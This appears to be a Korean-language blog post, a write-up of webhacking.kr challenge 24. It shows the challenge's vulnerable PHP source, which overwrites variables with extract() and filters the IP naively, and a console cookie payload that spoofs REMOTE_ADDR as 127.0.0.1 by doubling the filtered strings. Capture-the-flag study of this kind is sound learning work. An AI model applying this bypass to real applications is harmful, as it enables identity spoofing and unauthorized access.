{"pageProps":{"post":{"slug":"2017-02-04-webhackingkr24","content":"\n![](/assets/posts/webhackingkr/24_main.png)\n\n24번 문제는 register_globals와 관련된 문제이다.\n들어가자마자 Wrong IP! 라고 알려준다.\n\n페이지 소스를 봤을때 index.phps 가 주석처리 되어있길래 index.phps 페이지에 들어가 봤더니 아래와 같은 코드가 있었다.\n\n```php\n<?\n\nextract($_SERVER);\nextract($_COOKIE);\n\nif(!$REMOTE_ADDR) $REMOTE_ADDR=$_SERVER[REMOTE_ADDR];\n\n$ip=$REMOTE_ADDR;\n$agent=$HTTP_USER_AGENT;\n\n\nif($_COOKIE[REMOTE_ADDR])\n{\n$ip=str_replace(\"12\",\"\",$ip);\n$ip=str_replace(\"7.\",\"\",$ip);\n$ip=str_replace(\"0.\",\"\",$ip);\n}\n\necho(\"<table border=1><tr><td>client ip</td><td>$ip</td></tr><tr><td>agent</td><td>$agent</td></tr></table>\");\n\nif($ip==\"127.0.0.1\")\n{\n@solve();\n}\n\nelse\n{\necho(\"<p><hr><center>Wrong IP!</center><hr>\");\n}\n?>\n```\n소스를 보면 ip가 127.0.0.1일때 문제가 풀리는 것 같다.\n여기서 12,7.,0.이 공백으로 바뀌므로 두번씩 쳐줘야 한다.  `112277..00..00..1` 일때 `1(12)27(7.).0(0.).0(0.).1` 이 된다.\n\n24번 페이지 콘솔창에서 `javascript:document.cookie=\"REMOTE_ADDR=112277..00..00..1;\";` 를 입력해주고\n새로고침을 해주면 ip가 127.0.0.1로 바뀌고 문제가 풀린다.\n\n![](/assets/posts/webhackingkr/24_console.png)\n![](/assets/posts/webhackingkr/24_clear.png)\n\n","layout":"post","title":"[Webhacking.kr] 24","categories":["Webhacking.kr"],"excerpt":" ","comments":true,"share":true,"tags":["Web-hacking","webhacking.kr","write-up"]}},"__N_SSG":true}